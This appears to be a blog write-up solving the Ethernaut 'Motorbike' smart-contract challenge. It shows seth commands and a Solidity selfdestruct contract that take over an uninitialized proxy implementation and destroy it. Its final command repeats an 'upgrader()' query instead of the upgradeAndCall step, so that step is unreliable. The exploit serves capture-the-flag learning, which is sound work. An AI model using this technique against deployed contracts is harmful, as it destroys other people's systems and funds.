---
layout: post
title:  "OpenZeppelin Ethernaut 25: Motorbike"
date:   2022-07-05 11:57:16 +0800
---
In the past I have gone over all Ethernaut challenges, but it's good to see that more are still being made. Let's see how we can manage to solve this one.

The challenge text is: _"Ethernaut's motorbike has a brand new upgradable engine design. Would you be able to `selfdestruct` its engine and make the motorbike unusable?"_

We are presented with one file containing two contracts, the "motorbike" contract and the "engine" contract. Our objective is to make the "engine" contract somehow self destruct.

Having a look at the `Engine` contract we don't see any existing code that can call `selfdestruct` however the contract is able to make delegated calls, so if we can find a way to have the`Engine` contract make a delegated call to a contract that we choose, we can complete the objective.

The only way to make a delegated call is through the function `upgradeAndCall()`, but that does a check through the function `_authorizeUpgrade()` to ensure that the caller is `upgrader`. That's a shame, because the contract would surely already be initialized... right?

Let's have a check anyways just to be sure. First we have to find out the contract address of the `Engine` contract, because Ethernaut only tells us the address of the `Motorbike` contract. To do this we can check the storage slot at `_IMPLEMENTATION_SLOT`.
```
dev@dev:~/dev/ctf/ethernaut$ seth storage 0xaF6Ebc43FA73B9859e95Fa537526A67989d48882 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
0x00000000000000000000000032e5c3b3c6c402ceb7df4e4f530fd2b94154f61c
```

We have the address of the `Engine` contract, so now let's see if `upgrader` is set.

```
dev@dev:~/dev/ctf/ethernaut$ seth call 0x32e5c3b3c6c402ceb7df4e4f530fd2b94154f61c 'upgrader()'
0x0000000000000000000000000000000000000000000000000000000000000000
```

`upgrader` isn't set, so that means the contract hasn't been initialized, which in turn means that we can be the ones to initialize it ourselves. Let's initialize the contract.
```
dev@dev:~/dev/ctf/ethernaut$ seth send 0x32e5c3b3c6c402ceb7df4e4f530fd2b94154f61c 'initialize()'
```

Now that our address is `upgrader`, we are able to call the function `upgradeAndCall()` which means we can run delegated calls on contracts of our choosing. Let's deploy a contract that is able to self destruct.
{% highlight solidity %}
// SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

contract SelfDestruct {
        function die() external {
                selfdestruct(payable(0x0));
        }
}
{% endhighlight %}

With this contract, all we have to do now is pass it to `upgradeAndCall()` along with the `data` necessary to call the `die()` function.
```
dev@dev:~/dev/ctf/ethernaut$ seth sig "die()"
0x35f46994
```
```
dev@dev:~/dev/ctf/ethernaut$ seth call 0x32e5c3b3c6c402ceb7df4e4f530fd2b94154f61c 'upgrader()'
```

At this point, you can submit the challenge and you will pass.















[jekyll-docs]: https://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
